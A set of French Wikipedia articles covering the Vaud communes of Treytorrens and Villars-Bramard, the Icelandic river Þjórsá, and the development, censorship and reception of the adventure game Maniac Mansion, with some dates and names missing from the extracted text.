Lesp plus anciennes mentions de ce nom de lieu apparaissent sous la forme "Troterens" (1194), "Troiterens" (1233), "Trouotereins" (1251), "Tretorens" (1453).
Ce toponyme est formé d'un nom masculin germanique, du type "Trudhari" et du suffixe toponymique germanique "-ingos" (qui a donné "-ens", "-in", "-an"). Ce suffixe a été adopté dans l'espace gallo-roman à partir du et est très fréquent dans les cantons de Vaud et de Fribourg. Il est en général ajouté à un nom de personne germanique et signifie « chez les gens de », « ceux du clan de », le premier élément désignant en général le nom du personnage qui a fondé la localité.
Histoire.
Des vestiges romains ont été trouvés sur le territoire de la commune. Le village est mentionné pour la première fois sous le nom de "Troterens" en 1194. Au , les seigneurs de Treytorrens sont vassaux de l'évêque de Lausanne. Ils reconnaissent ensuite la suzeraineté de Pierre II de Savoie au milieu du siècle suivant. La seigneurie est possédée par Pierre Morel, de Fribourg en 1543, puis par les Molin d'Estavayer et les DuGué, réfugiés huguenots. Le village fait partie du bailliage de Moudon à l'époque bernoise, de 1536 à 1798, puis de district de Payerne de 1798 à 2007 et du district de la Broye-Vully depuis 2008.
Patrimoine bâti.
Le village de Treytorrens est inscrit comme site ISOS.
La commune peut s'enorgueillir d'une remarquable église, sobre édifice gothique du classé comme bien culturel d'importance nationale.
"Le château" (rue du Couvent 1), demeure des nobles de Treytorrens, remonte en tout cas au début du et est attestée comme « château, forteresse, maison forte ». La seigneurie et son domaine sont vendus à diverses reprises à partir de 1536. Au , le bâtiment appartient à la famille Correvon.
"L'ancienne maison Bise" (rue du Château 4-6), au nord de la chapelle est une autre maison noble remarquable qui résulte de la création d'une coseigneurie attribuée à une branche cadette de la famille de Treytorrens avant 1390. Vers le milieu du , Jacques Bize, commissaire général du Pays de Vaud, devient détenteur d'une partie de ce fief par son mariage avec Françoise de Treytorrens. En 1460, il rachète encore les parts de deux cousins, puis fait reconstruire la maison, qui affiche encore aujourd'hui, de nombreux éléments d'architecture gothique.
"Le collège", aujourd'hui maison de commune a été construit en 1882 et transformé en 1985 et 1992.
Population.
Gentilé et surnom.
Les habitants de la commune se nomment les Treytorranais.
Ils sont surnommés les Chiens.
Démographie.
Selon l'Office fédéral de la statistique, Treytorrens compte habitants en . Sa densité de population atteint hab./km.
En 2000, la population de Treytorrens est composée de 64 hommes (58,7 %) et 45 femmes (41,3 %). La langue la plus parlée est le français, avec 104 personnes (95,4 %). La deuxième langue est l'allemand (3 ou 2,8 %). Il y a 105 personnes suisses (96,3 %) et 4 personnes étrangères (3,7 %). Sur le plan religieux, la communauté protestante est la plus importante avec 81 personnes (74,3 %), suivie des catholiques (14 ou 12,8 %). 9 personnes (8,3 %) n'ont aucune appartenance religieuse.
La population de Treytorrens est de 195 habitants en 1850 et reste relativement stable jusqu'en 1941. Elle baisse jusqu'à 104 habitants en 1970 avant une nouvelle période stable. Le graphique suivant résume l'évolution de la population de Treytorrens entre 1850 et 2010 :
Politique.
Lors des élections fédérales suisses de 2011, la commune a voté à 32,62 % pour l'Union démocratique du centre. Les deux partis suivants furent le Parti libéral-radical avec 27,62 % des suffrages et le Parti socialiste suisse avec 15,58 %.
Lors des élections cantonales au Grand Conseil de , les habitants de la commune ont voté pour l'Union démocratique du centre à 44,22 %, le Parti libéral-radical à 30,08 %, les Verts à 8,74 %, le Parti socialiste à 8,74 %,le Parti bourgeois démocratique et les Vert'libéraux à 6,43 % et Vaud Libre à 1,80 %. 
Sur le plan communal, Treytorrens est dirigé par une municipalité formée de 5 membres et dirigée par un syndic pour l'exécutif et un Conseil général dirigé par un président et secondé par un secrétaire pour le législatif.
Économie.
Jusqu'au milieu du , l'économie communal était largement tournée vers l'agriculture, l'arboriculture fruitière et l'élevage qui représentent encore une part significative des emplois. Depuis quelques décennies, le village s'est développé comme résidence pour les travailleurs des villes voisines. Cette mutation s'est accompagnée par la création de plusieurs entreprises locales de service.
Transports.
Au niveau des transports en commun, Treytorrens fait partie des communautés tarifaires vaudoise (Mobilis) et fribourgeoise (Frimobil). Le bus CarPostal reliant Payerne à Thierrens et celui des Transports publics fribourgeois faisant le parcours Estavayer-le-Lac-Vuissens-Estavayer-le-Lac s'arrêtent dans la commune. Le village est aussi desservie par les bus sur appel Publicar, qui sont un service de CarPostal.

</doc>
<doc id="191794" url="https://fr.wikipedia.org/wiki?curid=191794" title="Þjórsá">
Þjórsá

Le Þjórsá, aussi orthographié Thjorsa, prononcé , est un fleuve d'Islande situé dans le sud du pays dont il est le cours d'eau le plus long avec ses .
Géographie.
Au tout début de son cours dans le Sprengisandur, le fleuve s'appelle Bergvatnskvíls ; à hauteur du Hofsjökull et notamment du Þjórsárjökull dont il reçoit les eaux de fonte, il prend le nom de Þjórsá. Dans un premier temps, il traverse les Hautes Terres. Le Þjórsá passe au nord de l'Hekla, puis la rivière Tungnaá le rejoint près de la ferme historique de Þjóðveldisbærinn. Après cela, le fleuve traverse la plaine du sud de l'Islande. Au milieu du fleuve se trouve la grande île Árnes qui autrefois fut une presqu’île. On y découvrit un ancien lieu d'assemblée ("Þing"). Entre les petites villes de Selfoss et de Hella, la route 1 traverse le Þjórsá sur un pont. Quelques kilomètres plus loin, le fleuve se jette dans l'océan Atlantique.
Le Þjórsá reste un fleuve à saumons.
Hydrologie.
Le débit est de à Urriðafoss et son bassin versant est de de superficie.
Avec ses affluents, il représente 27 % de l'hydroélectricité du pays.
Coulée de lave.
La coulée de lave de Þjórsá est le résultat de la plus importante éruption volcanique lavique terrestre de l'Holocène, que ce soit en volume () ou en surface recouverte (). Elle s'est produite il y a , probablement émise depuis le système volcanique de Bárðarbunga. La région de l'éruption a depuis été recouverte par d'autres dépôts volcaniques et la coulée de Þjórsá n'apparaît à l'air libre qu'à 70 kilomètres de l'emplacement supposé de son émission. Les Þjórsá et Hvítá longent le champ de lave qui se prolonge sous la mer à quelques centaines de mètres du rivage. La lave de Þjórsá est porphyritique avec des phénocristaux de feldspath clairs dans une matrice sombre.
Aménagements.
Landsvirkjun, la société gestionnaire, a démarré la construction de la centrale hydroélectrique de Búrfell en 1965 et mise en ligne, en 1969, une centrale de avec de .

</doc>
<doc id="191795" url="https://fr.wikipedia.org/wiki?curid=191795" title="Villars-Bramard">
Villars-Bramard

Villars-Bramard est une localité et une ancienne commune suisse du canton de Vaud, située dans la commune de Valbroye et le district de la Broye-Vully.
Histoire.
Villars-Bramard fut mentionné en 1155 sous le nom de Vilar Bermart. Plusieurs tumulus furent découverts dans la forêt de Farzin et un établissement romain au lieu-dit En Gravegny était utilisé comme carrière de pierre au . Au Moyen Âge, Villars-Bramard dépendait de l'évêque de Lausanne et faisait partie de la châtellenie de Villarzel. En 1215, l'abbaye d'Hauterive possédait la dîme de froment et d'avoine reçue d'Othon de Dompierre, droits qui furent confirmés par une bulle papale de 1356. Les Villarzel détenaient également des biens à Villars-Bramard. Le village fut rattaché au bailliage bernois de Moudon (1536-1798), puis au district de Payerne (1798-2006).
Des bornes de 1727 marquent encore la limite avec le canton de Fribourg. La chapelle Saint-Jean-Baptiste, attestée en 1453, relevait de la paroisse de Dompierre (Vaud). Une carrière de molasse, exploitée jusqu'en 1945, fut convertie en réserve naturelle dans les années 1960. Le village est resté agricole.
Lors des référendums du , les communes de Cerniaz, Combremont-le-Grand, Combremont-le-Petit, Granges-près-Marnand, Marnand, Sassel, Seigneux et Villars-Bramard ont validé une fusion pour former une nouvelle commune Valbroye qui a vu le jour au .
son altitude est de 703 à 755 mètres
Démographie.
Villars-Bramard compte 75 habitants en 1764, 192 en 1850, 172 en 1900, 127 en 1950 et 118 en 2000.

</doc>
<doc id="191796" url="https://fr.wikipedia.org/wiki?curid=191796" title="Maniac Mansion">
Maniac Mansion

 est un jeu d'aventure développé et édité par . Initialement commercialisé sur Commodore 64 et Apple II en octobre 1987, le jeu est ensuite publié sur DOS en 1988, sur Amiga et Atari ST en 1989 puis sur NES en 1990. Il suit les aventures du jeune Dave Miller qui tente de sauver sa petite amie enlevée par un scientifique fou, le docteur Fred Edison, dont la famille est sous le contrôle d'une météorite qui s’est écrasée derrière leur maison vingt ans auparavant. Le joueur contrôle ses personnages grâce à une interface en pointer-et-cliquer et doit résoudre des énigmes pour avancer dans le jeu.
Le jeu est conçu par Ron Gilbert et Gary Winnick en 1985. Pour le scénario, ils s'inspirent des clichés des films d'horreur et de série B auxquels ils incorporent des éléments humoristiques. Les personnages sont basés sur des personnes qu'ils connaissent ainsi que sur des personnages de films, de comics ou de magazines d'horreur. L'apparence de la maison des Edison s'inspire du bâtiment principal du où est à l'époque basé le studio de . L'interface du jeu est construite de manière à améliorer le système utilisé dans les jeux d'aventure textuels de l'époque. Pour réduire la quantité de travail nécessaire pour créer le jeu, Ron Gilbert développe un moteur de jeu, baptisé SCUMM, qui est ensuite réutilisé dans un grand nombre de jeux d'aventure développés par le studio.
Considéré comme un titre phare du genre, ' est, à sa sortie, acclamé par la presse spécialisée. De nombreuses critiques saluent ainsi ses graphismes, ses scènes cinématiques, ses animations et son humour. Son interface en pointer-et-cliquer est considérée comme une révolution pour le genre et influence un grand nombre de jeux d'aventure. En 1990, le jeu donne également naissance à une série télévisée, écrite par Eugene Levy et mettant en scène Joe Flaherty, qui dure trois saisons et 66 épisodes. Une suite intitulée ' est publiée par en 1993. À sa sortie, elle est acclamée par les critiques et reste considérée comme un des meilleurs jeux du genre.
Trame.
"" se déroule dans la maison de la famille Edison, composée du Docteur Fred, de la nurse Edna et de leur fils Ed. La maison est également habitée par deux tentacules vivant avec la famille Edison, le tentacule pourpre et le tentacule vert. La séquence d'introduction montre la chute d'une météorite qui s'écrase derrière la maison vingt ans avant les événements se déroulant durant le jeu. La météorite prend alors le contrôle de la famille Edison et pousse le docteur Fred à récupérer des cerveaux humains pour ses expériences, sa famille l'encourageant dans ses recherches. Un jour, la petite amie de Dave Miller, la pom-pom girl Sandy Pantz, disparaît sans laisser de trace, ce qui pousse Dave à soupçonner le docteur Fred de l'avoir kidnappée. Après l'introduction du jeu, Dave et ses deux amis se préparent à entrer dans la maison pour sauver Sandy. Le joueur doit alors sélectionner parmi six personnages les deux qui accompagneront Dave.
Système de jeu.
' est un jeu d'aventure en deux dimensions. Pour progresser dans le jeu et retrouver Sandy, le joueur dispose de trois personnages avec lesquels il explore la maison des Edison et résout des énigmes. Les pièces de la maison sont représentées en vue de côté et défilent latéralement grâce à la technique du '. Le joueur contrôle ses personnages par l'intermédiaire d’une interface graphique en pointer-et-cliquer et les fait interagir avec leur environnement grâce à quinze commandes verbales, comme , qu'il peut utiliser pour communiquer avec un personnage. Chaque personnage possède des capacités qui lui sont propres. Par exemple, Syd et Razor peuvent jouer d'un instrument et Bernard peut réparer des appareils. Le jeu peut être terminé avec n'importe quelle combinaison de personnages. Certaines énigmes ne peuvent en revanche être résolues qu'avec des capacités spécifiques. L'action est fréquemment interrompue par des scènes cinématiques, un terme inventé par Ron Gilbert, des séquences animées non-interactives, qui fournissent au joueur des informations au sujet des actions des personnages non-joueurs et qui permettent de faire avancer l'histoire. En dehors du tentacule vert, les habitants de la maison sont des menaces pour les personnages contrôlés par le joueur et peuvent les enfermer ou les tuer s'ils les voient. Si tous les personnages meurent, la partie est terminée. Le jeu possède cinq fins qui dépendent des personnages sélectionnés, des personnages qui survivent et des événements qui se déroulent pendant la partie.
Développement.
Conception.
La conception de ' commence en 1985 et en confie le développement à Ron Gilbert et Gary Winnick. Ron Gilbert vient alors d’être engagé pour trois mois par Noah Falstein afin de programmer le jeu ' et Gary Winnick travaille à l’époque sur le développement de "" au cours duquel il fait connaissance avec Gilbert et découvre que celui-ci partage ses goûts en matière d’humour, de films et de programmes de télévision. Gilbert est alors engagé à plein temps par . Comme pour les autres titres développés à l’époque par le studio, la direction de la société laisse beaucoup de libertés à l’équipe de développement, ce qui, d’après Gilbert, explique le succès de ces jeux.
Les deux développeurs collaborent sur l’écriture du scénario et la conception du jeu mais travaillent séparément pour la programmation et la conception artistique. Gilbert se charge ainsi de la programmation alors que Winnick crée les visuels du jeu. S’inspirant de leur passion commune pour les films d’horreur de série B, ils décident de créer un jeu qui mélange humour et horreur et qui se déroule dans une maison hantée. Ils sont notamment influencés par un film d’horreur, qu’ils jugent ridicule, dans lequel des adolescents se font massacrer un par un dans une maison sans jamais avoir l’idée de sortir de celle-ci. Le duo combine ensuite cette idée avec les clichés des films d’horreur populaires de l’époque, comme "Vendredi 13" ou "Les Griffes de la nuit", pour définir le cadre du jeu. Le début du développement donne lieu a de nombreuses expérimentations et est très . D’après Gilbert, et les idées viennent spontanément. Durant cette période, déménage et s’installe dans la du . Winnick décide alors de s’inspirer du bâtiment principal de celui-ci pour concevoir l’aspect de la maison dans laquelle se déroule l’aventure. Il transpose ainsi dans le jeu plusieurs pièces du bâtiment principal, comme la bibliothèque et ses escaliers en spirale ou la pièce des médias, avec son écran géant et son grand piano. Le duo choisit de se focaliser sur l'histoire et les personnages et essaie de maintenir un équilibre entre . Les premiers concepts de personnages mettent en scène une fratrie et leurs amis. Ces concepts évoluent ensuite peu à peu jusqu'à aboutir aux personnages de la version finale. Pour les concevoir, Gilbert et Winnick s’inspirent de stéréotypes mais aussi de personnes qu'ils connaissent. Par exemple, le personnage de Razor est basé sur la petite amie de Winnick de l'époque. Pour la famille Edison, ils s’inspirent de différents personnages de films et d’éléments des magazines publiés par et . C'est alors qu'ils pensent à donner à chaque personnage des capacités différentes. Limités par la capacité des supports de l'époque, ils abandonnent certaines idées de personnages. Pour parodier les films d'horreur, ils insèrent de nombreux clichés dans le scénario. Par exemple, la météorite qui prend le contrôle de la famille Edison s'inspire du sketch "La Mort solitaire de Jordy Verrill" du film d'horreur "" de 1982. Ils ajoutent également une plante carnivore, qui se nourrit comme un humain, basée sur le méchant du film "La Petite Boutique des horreurs" sorti en 1986.
Les deux concepteurs ont des difficultés à choisir le genre de jeu vidéo qu'ils souhaitent réaliser. Gilbert décrit ainsi leurs premières idées comme étant . Alors qu'il rend visite à sa famille pour Noël, Gilbert voit son cousin jouer à '. Il comprend alors que les concepts qu’ils ont imaginés peuvent fonctionner dans un jeu de ce type et passe le reste de ses vacances à jouer pour se familiariser avec le genre. Gilbert et Winnick conçoivent la structure de base et l'histoire de ' avant de commencer à programmer le jeu. La première version de celui-ci est un simple jeu de papier et crayon, le plan de la maison servant de plateau de jeu et des cartes représentant les personnages et les événements. Des lignes reliant les différentes pièces illustrent les chemins pouvant être empruntés par le joueur. Pour organiser les énigmes du jeu, ils réalisent, sur des bandes d'acétate de cellulose, un schéma qui relie entre elles les différentes combinaisons d'objets et de personnages. Impressionné par la complexité du résultat, Winnick intègre la carte ainsi obtenue dans le jeu sous la forme d'une affiche. Chaque personnage pouvant contribuer à avancer dans l'aventure grâce à des talents et des ressources différentes, le duo met plusieurs mois à concevoir les différentes combinaisons d'événements possibles. Le développement du jeu prend ainsi beaucoup de retard et envisage de licencier Gilbert. Bien que les événements du jeu aient été définis en amont, ils ne commencent à écrire les dialogues qu'après avoir commencé la programmation du jeu. Ceux-ci sont écrits par David Fox.
Graphismes.
Le jeu est d'abord destiné à l'ordinateur personnel Commodore 64 et les développeurs doivent donc l'optimiser pour qu'il fonctionne correctement avec la quantité limitée de mémoire vive () dont dispose la machine. Pour cela, ils décident d'utiliser la technique du pour faire défiler les décors des pièces et ainsi limiter le nombre d’éléments qui s’affichent simultanément à l’écran. Avec des graphismes en , ils ne peuvent cependant pas utiliser cette méthode, car elle demande trop de mémoire vive pour le Commodore (environ ). Ils doivent donc réduire le niveau de détails des personnages afin qu’ils ne prennent qu'un kilooctet pour permettre le des décors. Le jeu utilise des tuiles de 8x8 pixels. Pour passer outre aux limitations des chipsets VIC-II du Commodore, qui ne permettent pas d’en utiliser plus de 256, Gilbert décide de concevoir un programme capable de générer ces tuiles à partir des réalisés par Winnick. Ce programme compare les tuiles du jeu, puis en génère des copies approximatives capables de remplacer plusieurs tuiles différentes. Après plusieurs itérations de ce procédé et après avoir inspecté le résultat, les développeurs parviennent à réduire suffisamment le nombre de tuiles. Pour rendre les personnages facilement reconnaissables, Winnick leur dessine des têtes relativement grosses. Chaque personnage est constitué de trois multicolores superposés. Le Commodore 64 ne pouvant supporter des d’une largeur supérieure à 24 pixels, les développeurs s’arrangent pour que les animations des personnages ne sortent jamais de ce cadre.
Création du moteur de jeu.
Gilbert commence à programmer le jeu avec un assembleur pour le microprocesseur 6502 qui est à l'époque la norme pour les jeux sur Commodore 64. Il réalise cependant rapidement que le jeu est trop complexe pour être facilement programmé dans ce langage et qu'ils ont besoin d’un moteur de jeu similaire à l' de . Gilbert pense au départ utiliser le langage Lisp mais il choisit finalement une syntaxe plus proche du C. Il discute du problème avec un autre employé de, Chip Morningstar, qui l'aide à construire les fondations du moteur de jeu que Gilbert va ensuite finaliser. Il conçoit le moteur de jeu afin de le rendre multitâche et ainsi permettre aux concepteurs d’isoler et de manipuler certains objets du jeu indépendamment des autres. La majeure partie des six à neuf premiers mois de développement est ainsi consacrée à la construction du moteur de jeu.
Lorsqu’il est encore au lycée, Gilbert apprécie les jeux comme ' ou les titres développés par Infocom, mais il regrette qu’ils ne soient pas dotés de graphismes. Il pense en effet que les éléments visuels incorporés dans les jeux d’aventures par des studios comme ajoutent une dimension supplémentaire au genre et constituent une réelle amélioration. Il regrette en revanche qu’ils reposent sur une interface en ligne de commande. Son objectif est donc de créer une interface capable de restituer la structure d’un jeu d’aventure en mode texte classique mais qui dispense le joueur de taper des lignes de commandes. Dans ', il regrette en effet qu’il soit nécessaire de deviner la commande à utiliser pour réaliser une action et considère qu’il devrait être possible d’interagir directement avec les éléments qui apparaissent à l’écran. Son raisonnement le conduit à penser que si un élément apparaît à l’écran, le joueur doit pouvoir cliquer dessus et que par extension, le joueur doit également pouvoir cliquer sur une commande. Il imagine alors une nouvelle interface plus simple, basée sur le principe du pointer-et-cliquer, qui décharge le joueur de lignes de commandes à taper. Il répertorie au départ une quarantaine de commandes verbales puis simplifie peu à peu cette liste jusqu’à la réduire à douze commandes essentielles. Il intègre ensuite celles-ci dans le langage de script de manière à créer un interpréteur similaire à ceux utilisés par Sierra, comme l' et le . Après environ un an de développement, il termine le moteur de jeu qu’il baptise SCUMM (pour ). Celui-ci permet notamment aux développeurs de s’affranchir de programmer en langage de bas niveau, ce qui réduit le temps nécessaire pour développer d’autres jeux du même type. Il permet aussi de faciliter l’adaptation du jeu sur d’autres plates-formes.
Script et tests.
Pour écrire le script du jeu, Gilbert est assisté de David Fox, un des développeurs de "", qui est alors en attente d'un nouveau projet. Celui-ci ne doit au départ travailler qu’un mois sur le jeu, mais il participe finalement au projet pendant près de six mois. Après avoir discuté des événements du jeu avec les deux concepteurs, il utilise le moteur pour créer les pièces de la maison. Les développeurs délimitent ensuite dans ces pièces les zones dédiées que les personnages peuvent traverser. David Fox écrit également les dialogues et chorégraphie l’action du jeu, avec l'aide de Gilbert. Il propose aussi quelques idées, comme celle de mettre un hamster dans le four à micro-ondes, qu’il imagine après avoir regardé les dessinés par Winnick.
Lorsqu'ils élaborent le du jeu, les développeurs veulent s’assurer que l’aventure est amusante et qu’elle ne punit pas le joueur pour avoir utilisé la même logique que dans le monde réel. En effet, Fox note que dans "", le personnage du joueur peut brusquement mourir en se coupant avec un verre cassé. Il considère ce procédé comme , puisqu'il est en réalité facile de ramasser un bout de verre sans mourir. L’équipe souhaite donc éviter ce genre de mort subite afin d'éviter au joueur de devoir constamment revenir à une sauvegarde antérieure. Pour cela, ils incluent un certain nombre de possibilités qui donnent au joueur plus de liberté. Ainsi, même si le personnage peut être tué au cours de l’aventure, il est impossible de l’être autrement qu’intentionnellement.
En scriptant le jeu, les développeurs réalisent que la multiplicité des personnages augmente sensiblement la complexité du jeu et entraîne un certain nombre de problèmes, comme ces situations cul-de-sac à partir desquelles le joueur ne peut plus finir le jeu. Pour les résoudre, l’équipe doit souvent modifier certaines énigmes. ne dispose à l’époque que d’un testeur et beaucoup d’erreurs de ce type ne sont donc pas détectées, malgré l'aide apportée par l'oncle de Gilbert pour tester le jeu.
Publication.
Alors que pour ses précédents jeux, fait appel à des éditeurs indépendants, le studio décide de prendre en main la publication de "". recrute alors Ken Macklin, une connaissance de Gary Winnick, pour concevoir l' de l'emballage. Pour créer l’arrière de la boîte, Gilbert et Winnick collaborent avec le département marketing du studio. Le duo crée également un encart qui inclut des conseils, le du jeu et des blagues. Après 18 à 24 mois de développement, le jeu est présenté lors du de Chicago en 1987. Le jeu est d'abord publié sur Commodore 64 et Apple II en . Après la plainte d'un client de Toys “R” Us au sujet du mot ( en anglais) qui apparaît à l'arrière de la boîte, le magasin retire le jeu de ses rayons jusqu'à ce que modifie l'emballage du jeu. Le jeu est ensuite publié sur PC en mars 1988, sur Amiga et Atari ST en 1989 puis sur NES en 1990.
Versions françaises sur micro-ordinateur.
Maniac Mansion a été adapté en version française sur Amiga, Atari ST, et sur PC. Ces versions comportent la boite en deux parties avec un sticker jaune "Maniac Mansion Version intégralement en français (disques et documentation)", une notice traduite en français, un poster traduit en français, des codes, des lunettes rouges Lucasfilm Games ainsi que les disques de jeu.
On distingue ces versions par le sticker frontal et latéral (ici en marron sur la photo). Il est bleu pour la version Atari ST.
En ce qui concerne les versions sur PC, elles existent en version 3,5", 5,25" et 3,5"+5,25". Il existe un sticker frontal différent pour chacune de ces versions.
Les disquettes de jeu des versions françaises ne sont pas distinguables de celles des versions anglaises, on y trouve systématiquement les stickers bleus avec le logo du jeu. On trouve des disquettes bleues comme des disquettes blanches, il ne semble pas exister d'autre couleur.
Adaptation sur NES.
"" est le premier jeu développé par pour la NES. Les développeurs font alors face à une charge de travail trop importante qui les empêche de se focaliser sur cette adaptation, Douglas Crockford se porte donc volontaire pour gérer le projet. Du fait des différences fondamentales entre le PC et la NES, il doit adapter le moteur de jeu à cette dernière et une version modifiée du SCUMM, baptisée NES SCUMM, est créée pour l’occasion. La NES utilise notamment une résolution d'écran différente, qui implique une refonte complète des graphismes, et peut accomplir certaines tâches plus rapidement que les PC de l’époque. Pour tester l’adaptation, Crockford fait appel à Tim Schafer qui travaillera plus tard sur plusieurs autres jeux d’aventure développés par dont "".
Pour la version PC du jeu, demande de censurer certaines obscénités dont notamment la phrase d'introduction de Dave Miller, , qui est transformée en . Pour la version NES, la censure va encore plus loin afin d'adapter le jeu à un public plus jeune et être ainsi en accord avec la politique de Nintendo. Le président de Jaleco USA, Howie Rubin, met alors en garde Crockford au sujet des éléments du jeu que Nintendo est susceptible de censurer, par exemple le mot . Crockford prend en compte cette mise en garde et fournit donc à Jaleco une liste des éléments du jeu qui, selon lui, peuvent être perçus comme n'étant pas appropriés. L’équipe de Jaleco juge alors le contenu du jeu et soumet une première version du jeu à Nintendo pour approbation. Un mois après réception du jeu, Nintendo fournit au studio un rapport qui liste les textes et les images qui doivent être censurés. Crockford modifie alors le contenu du jeu en prenant garde à respecter les aspects essentiels de celui-ci. Nintendo souhaite par exemple retirer les graffitis qui apparaissent sur le mur d'une pièce, mais ces derniers donnent des conseils au joueur et il ne peut donc pas l'enlever sans supprimer du même coup de message d'aide. Il décide donc de simplement réduire la longueur du message. D'après l'éditeur, certains dialogues sont également problématiques. C’est par exemple le cas des répliques d’Edna, jugées trop suggestives, et d'une phrase du docteur Fred . Pour cette dernière, Nintendo explique ainsi que c’est le mot qui pose problème et Crockford décide donc de le remplacer par le terme et, par souci de cohérence, de supprimer une affiche de la chambre du tentacule vert où est écrit . Nintendo met également en avant des problèmes liés à la nudité entre autres sur une affiche qui représente une momie dans une pose de , sur un calendrier de maillot de bain et sur une statue de femme. Crockford accepte de supprimer l’affiche et le calendrier mais considère que la statue doit rester dans le jeu, puisque celle-ci est basée sur une sculpture de Michel-Ange. Les censeurs de Nintendo proposent alors de la modifier, ce qui pousse à retirer la statue du jeu. Nintendo va jusqu'à faire censurer le terme (en anglais, peut signifier « ordure » ou « salaud ») qui apparaît à la fin des crédits du jeu et Crockford se demande alors pourquoi les censeurs ont négligé certains contenus plus offensants. Rétrospectivement, Crockford juge que les standards imposés par Nintendo tendent à rendre les jeux .
Après avoir implémenté ces modifications, soumet à nouveau "" à Nintendo qui l’édite alors à exemplaires. L’adaptation du jeu est annoncée par le magazine officiel de l’éditeur, "", début 1990. Le magazine continue ensuite de couvrir l’actualité du jeu jusqu'à sa publication par Jaleco en .
La possibilité de mettre un hamster au micro-ondes est présente dans la version NES du jeu et Crockford juge que cela montre à quel point les critères de censure de Nintendo sont compliqués. Ce détail est plus tard remarqué par Nintendo qui demande alors sa suppression mais la version NTSC n'est pas rééditée et le jeu disponible en Amérique du Nord inclut donc toujours cette possibilité. Elle est néanmoins retirée de la version publiée en région PAL.
L'adaptation de la musique est réalisée par le studio . Comme la plupart des portages précédents des titres de , la version NES du jeu ne contient au départ pas de musique de fond. Tard dans le développement, Jaleco demande néanmoins d'en ajouter. Le fondateur et président de , David Warhol, note en effet que les jeux vidéo de l'époque . Warhol demande donc à David Hayes, à George Sanger et au groupe de celui-ci, , d'écrire les musiques du jeu. Les musiciens composent alors des musiques adaptées aux différents personnages, avec par exemple un thème punk rock pour Razor, un thème électro-rock pour Bernard et un thème surf rock pour Jeff. Pour le personnage principal, Hayes s'inspire de la chanson "" de Thin Lizzy. Warhol se charge ensuite d'adapter les musiques au format chiptune de la NES.
Accueil.
Versions Commodore 64 et PC.
À la sortie du jeu en 1987, ses graphismes sont jugés plutôt réussis. Les critiques mettent notamment en avant le niveau de détail et la qualité de l’animation des sprites représentant les personnages. Ils notent ainsi que chacun d’eux est bien réalisé et . La presse note également que le mouvement des lèvres des personnages, qui bougent lorsqu’ils parlent, est convaincant même s'il ne correspond pas à ce qu’ils disent. Les scènes cinématiques du jeu sont particulièrement appréciées, la presse spécialisée notant qu’elles sont créatives et bien réalisées. D’après certaines critiques, ces scènes parviennent à donner au joueur des informations pour avancer, tout en renforçant le suspense et le sentiment d’urgence du jeu. Les similarités entre ces dernières et le cinéma valent au jeu d’être souvent comparé à des films. Les critiques le comparent ainsi au film à sketches "", mais aussi à des films d’horreur comme "Psychose", "Vendredi 13", "Massacre à la tronçonneuse", "La Famille Addams" ou "Scooby-Doo". Un journaliste fait également le lien entre les cinématiques du jeu et celles de précédents titres développés par comme ' ou '. De son côté, l’ambiance sonore du jeu ne fait pas l’unanimité. Ainsi, si certaines critiques mettent en avant la qualité de la bande son, d’autres regrettent la quasi-absence de musique. Au niveau de l’ambiance, la presse spécialisée fait l’éloge de l'humour noir du jeu et note que contrairement à beaucoup de films et de romans d’horreur, il parvient à maintenir un parfait équilibre entre humour et suspense. Les critiques saluent également la présence de références aux classiques du genre et de . Son scénario est jugé cohérent et intéressant, voire incroyable.
Les journalistes font également l’éloge de son interface en pointer-et-cliquer qu’ils jugent très facile à prendre en main, et que certains décrivent même comme . Le journaliste du magazine ' regrette néanmoins le nombre de commandes limité mais note que ce problème est largement compensé par l’intelligence du programme. Au niveau du ', la possibilité de contrôler plusieurs personnages et de passer de l’un à l’autre à tout moment est décrite comme l’un des points forts du jeu. Les critiques notent en particulier que les personnages ont chacun un caractère et des compétences qui leur sont propres et que celles-ci peuvent influencer la manière de résoudre certaines énigmes du jeu. D’après eux, le jeu peut ainsi être rejoué plusieurs fois avec différentes équipes. Les énigmes sont décrites comme étant variées et d’une difficulté modérée. Le journaliste de "" note qu’elles améliorent réellement le jeu et ne se contentent pas d’obstruer le joueur en le mettant dans des situations dont il ne peut se sortir. Certains critiques considèrent néanmoins que compte tenu de la faible difficulté des énigmes, le jeu n’est pas conseillé aux joueurs les plus expérimentés. Globalement, le jeu reçoit un accueil très positif et les journalistes le décrivent souvent comme l’un des meilleurs jeux du genre.
Versions Amiga et Atari ST.
Comme la version originale, la version Amiga du jeu est plutôt bien accueillie par la presse spécialisée à sa sortie en 1989. Pour le journaliste Pat Winstanley du magazine "ACE", ses graphismes le rendent en effet même si les déplacements des personnages et le scrolling soient parfois . Concernant son système de jeu, il estime que son interface est simple à prendre en main et qu’il nécessite une . Il met également en avant la nécessité de faire coopérer les personnages pour résoudre les énigmes, qu’il considère comme le point fort du jeu, ainsi que les réponses faites par les personnages. Il regrette en revanche que les interactions se limitent trop souvent à donner des objets ainsi que la nécessité de changer fréquemment de disquette, parfois même en plein milieu de l’action. Les journalistes du magazine "Amiga Action" font également l’éloge des graphismes du jeu, même s'ils considèrent que dans ce domaine, il est moins bon que "Indiana Jones et la Dernière Croisade". Ils regrettent en revanche que le jeu ne tire pas partie des capacités sonores de l’Amiga en dehors de la séquence d’ouverture du jeu. Plus globalement, ils le décrivent comme une aventure qui, combinée avec son côté interactif et son humour, en fait un grand jeu. La version Atari ST fait également l’objet de critiques positives. C’est notamment le cas de celle de Mike Gerrard, du magazine "", qui salue en particulier ses graphismes et sa réalisation, qu’il juge que celle des jeux Sierra On-Line. Il salue également le casting du jeu ainsi que la bonne utilisation qu’il fait de la mémoire de la machine pour stocker les décors, qui permet d’éviter de changer en permanence de disquette.
Version NES.
